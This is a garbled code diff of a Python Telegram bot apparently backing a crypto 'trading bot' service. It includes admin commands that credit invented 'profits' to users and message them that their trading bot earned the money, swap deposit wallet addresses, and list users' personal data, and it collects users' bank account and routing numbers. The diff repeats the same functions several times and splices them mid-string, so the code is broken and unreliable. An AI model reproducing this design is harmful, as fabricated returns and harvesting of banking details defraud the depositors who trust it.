+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
             ],
             DEPOSIT_AMOUNT: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_deposit_amount),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
